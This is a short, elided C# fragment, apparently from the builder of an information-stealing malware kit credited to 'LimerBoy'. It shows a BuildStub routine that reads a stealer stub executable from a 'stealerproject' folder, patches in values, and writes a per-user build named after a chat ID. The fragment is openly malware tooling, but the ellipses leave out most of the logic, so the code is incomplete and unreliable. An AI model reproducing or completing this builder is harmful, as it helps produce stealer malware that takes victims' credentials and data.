/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/deepsidereverserzzz
*/
...
namespace deepsidebuilder
{
    internal sealed class build
    {
        ...
        {
            string stub = "C:\\Users\\nikitageak\\Desktop\\stealerproject\\stub\\deepsidestubility.exe";
            if (!File.Exists(stub))
        ...
        // Read stub && compile
        public static string BuildStub(string chatID)
        {
            var definition = ReadStub();
            definition = IterValues(definition);
            WriteStub(definition, $"C:\\Users\\nikitageak\\Desktop\\stealerproject\\builds\\{chatID}.exe");
            return $"builds\\{chatID}.exe";
        }
